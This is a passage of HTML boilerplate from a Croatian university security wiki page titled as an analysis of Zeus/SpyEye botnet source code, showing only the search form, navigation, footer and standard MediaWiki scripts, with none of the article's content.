	<h5><label for="searchInput">Traži</label></h5>
	<form action="http://security.foi.hr/wiki/index.php" id="searchform">
		<input type='hidden' name="title" value="Posebno:Traži"/>
				<input id="searchInput" name="search" type="text"  title="Pretraži ovaj wiki [f]" accesskey="f"  value="" />
		<input type='submit' name="go" class="searchButton" id="searchGoButton"	value="Kreni" title="Idi na stranicu s ovim imenom ako ona postoji" />
		<input type="submit" name="fulltext" class="searchButton" id="mw-searchButton" value="Traži" title="Traži ovaj tekst na svim stranicama" />
			</form>
</div>

<!-- /2 -->
			</div>
		</div>
		<!-- /header -->
		<!-- panel -->
			<div id="mw-panel" class="noprint">
				<!-- logo -->
					<div id="p-logo"><a style="background-image: url(../../../images/osslogo.png);" href="../../../wiki.html"  title="Glavna stranica"></a></div>
				<!-- /logo -->
				
<!-- navigation -->
<div class="portal" id='p-navigation'>
	<h5>Orijentacija</h5>
	<div class="body">
				<ul>
					<li id="n-mainpage-description"><a href="../../../wiki.html" title="Posjeti glavnu stranicu [z]" accesskey="z">Glavna stranica</a></li>
					<li id="n-portal"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:Portal_zajednice" title="O projektu, što možete učiniti, gdje je što">Portal zajednice</a></li>
					<li id="n-currentevents"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:Novosti" title="O trenutačnim događajima">Aktualno</a></li>
					<li id="n-recentchanges"><a href="../Posebno:Nedavne_promjene.html" title="Popis nedavnih promjena u wikiju. [r]" accesskey="r">Nedavne promjene</a></li>
					<li id="n-randompage"><a href="../Posebno:Slučajna_stranica.html" title="Učitaj slučajnu stranicu [x]" accesskey="x">Slučajna stranica</a></li>
					<li id="n-help"><a href="../Pomoć:Pomoć.html" title="Mjesto za pomoć suradnicima.">Pomoć</a></li>
				</ul>
			</div>
</div>

<!-- /navigation -->

<!-- SEARCH -->

<!-- /SEARCH -->

<!-- TOOLBOX -->
<div class="portal" id="p-tb">
	<h5>Traka s alatima</h5>
	<div class="body">
		<ul>
					<li id="t-whatlinkshere"><a href="http://security.foi.hr/wiki/index.php/Posebno:%C5%A0to_vodi_ovamo/Botneti_i_napredni_oblici_malwarea_-_analiza_zeus_/_spyeye_sourcea" title="Popis svih stranica koje sadrže poveznice ovamo [j]" accesskey="j">Što vodi ovamo</a></li>
						<li id="t-recentchangeslinked"><a href="http://security.foi.hr/wiki/index.php/Posebno:Povezane_promjene/Botneti_i_napredni_oblici_malwarea_-_analiza_zeus_/_spyeye_sourcea" title="Nedavne promjene na stranicama na koje vode ovdašnje poveznice [k]" accesskey="k">Povezane stranice</a></li>
																																										<li id="t-specialpages"><a href="../Posebno:Posebne_stranice.html" title="Popis posebnih stranica [q]" accesskey="q">Posebne stranice</a></li>
									<li id="t-print"><a href="http://security.foi.hr/wiki/index.php?title=Botneti_i_napredni_oblici_malwarea_-_analiza_zeus_/_spyeye_sourcea&amp;printable=yes" rel="alternate" title="Verzija za ispis ove stranice [p]" accesskey="p">Verzija za ispis</a></li>
						<li id="t-permalink"><a href="http://security.foi.hr/wiki/index.php?title=Botneti_i_napredni_oblici_malwarea_-_analiza_zeus_/_spyeye_sourcea&amp;oldid=5661" title="Trajna poveznica na ovu verziju stranice">Trajna poveznica</a></li>
						</ul>
	</div>
</div>

<!-- /TOOLBOX -->

<!-- LANGUAGES -->

<!-- /LANGUAGES -->
			</div>
		<!-- /panel -->
		<!-- footer -->
		<div id="footer">
											<ul id="footer-info">
																	<li id="footer-info-lastmod"> Datum zadnje promjene na ovoj stranici: 23:25, 6. siječnja 2012.</li>
																							<li id="footer-info-viewcount">Ova stranica je pogledana 38.214 puta.</li>
																							<li id="footer-info-copyright">Sadržaji se koriste u skladu s <a href="http://creativecommons.org/licenses/by-sa/3.0/" class="external ">Creative Commons Attribution Share Alike</a>.</li>
															</ul>
															<ul id="footer-places">
																	<li id="footer-places-privacy"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:Za%C5%A1tita_privatnosti" title="SIS Wiki:Zaštita privatnosti">Zaštita privatnosti</a></li>
																							<li id="footer-places-about"><a href="../SIS_Wiki:O_projektu_SIS_Wiki.html" title="SIS Wiki:O projektu SIS Wiki">O projektu SIS Wiki</a></li>
																							<li id="footer-places-disclaimer"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:General_disclaimer" title="SIS Wiki:General disclaimer">Odricanje od odgovornosti</a></li>
															</ul>
											<ul id="footer-icons" class="noprint">
					<li id="footer-copyrightico">
						<a href="http://creativecommons.org/licenses/by-sa/3.0/"><img src="../../skins/common/images/cc-by-sa.png" alt="Creative Commons Attribution Share Alike" width="88" height="31" /></a>
					</li>
					<li id="footer-poweredbyico">
						<a href="http://www.mediawiki.org/"><img src="../../skins/common/images/poweredby_mediawiki_88x31.png" alt="Powered by MediaWiki" width="88" height="31" /></a>
					</li>
				</ul>
						<div style="clear:both"></div>
		</div>
		<!-- /footer -->
		
<script src="../../load.php%3Fdebug=false&amp;lang=hr&amp;modules=startup&amp;only=scripts&amp;skin=vector&amp;*"></script>
<script>if ( window.mediaWiki ) {
	mediaWiki.config.set({"wgCanonicalNamespace": "", "wgCanonicalSpecialPageName": false, "wgNamespaceNumber": 0, "wgPageName": "Botneti_i_napredni_oblici_malwarea_-_analiza_zeus_/_spyeye_sourcea", "wgTitle": "Botneti i napredni oblici malwarea - analiza zeus / spyeye sourcea", "wgAction": "view", "wgArticleId": 15, "wgIsArticle": true, "wgUserName": null, "wgUserGroups": ["*"], "wgCurRevisionId": 5661, "wgCategories": [], "wgBreakFrames": false, "wgRestrictionEdit": [], "wgRestrictionMove": []});
}
</script>
<script>if ( window.mediaWiki ) {
	mediaWiki.loader.load(["mediawiki.util", "mediawiki.legacy.wikibits", "mediawiki.legacy.ajax"]);
	mediaWiki.loader.go();
}
</script>

<script>if ( window.mediaWiki ) {
	mediaWiki.user.options.set({"ccmeonemails":0,"cols":80,"contextchars":50,"contextlines":5,"date":"default","diffonly":0,"disablemail":0,"disablesuggest":0,"editfont":"default","editondblclick":0,"editsection":1,"editsectiononrightclick":0,"enotifminoredits":0,"enotifrevealaddr":0,"enotifusertalkpages":1,"enotifwatchlistpages":0,"extendwatchlist":0,"externaldiff":0,"externaleditor":0,"fancysig":0,"forceeditsummary":0,"gender":"unknown","hideminor":0,"hidepatrolled":0,"highlightbroken":1,"imagesize":2,"justify":0,"math":1,"minordefault":0,"newpageshidepatrolled":0,"nocache":0,"noconvertlink":0,"norollbackdiff":0,"numberheadings":0,"previewonfirst":0,"previewontop":1,"quickbar":1,"rcdays":7,"rclimit":50,"rememberpassword":0,"rows":25,"searchlimit":20,"showhiddencats":0,"showjumplinks":1,"shownumberswatching":1,"showtoc":1,"showtoolbar":1,"skin":"vector","stubthreshold":0,"thumbsize":2,"underline":2,"uselivepreview":0,"usenewrc":0,"watchcreations":0,"watchdefault":0,"watchdeletion":0,
	"watchlistdays":3,"watchlisthideanons":0,"watchlisthidebots":0,"watchlisthideliu":0,"watchlisthideminor":0,"watchlisthideown":0,"watchlisthidepatrolled":0,"watchmoves":0,"wllimit":250,"variant":"hr","language":"hr","searchNs0":true,"searchNs1":false,"searchNs2":false,"searchNs3":false,"searchNs4":false,"searchNs5":false,"searchNs6":false,"searchNs7":false,"searchNs8":false,"searchNs9":false,"searchNs10":false,"searchNs11":false,"searchNs12":false,"searchNs13":false,"searchNs14":false,"searchNs15":false});;mediaWiki.loader.state({"user.options":"ready"});
}
</script>		<!-- fixalpha -->
		<script type="text/javascript"> if ( window.isMSIE55 ) fixalpha(); </script>
		<!-- /fixalpha -->
		<!-- Served in 1.245 secs. -->			</body>
</html>
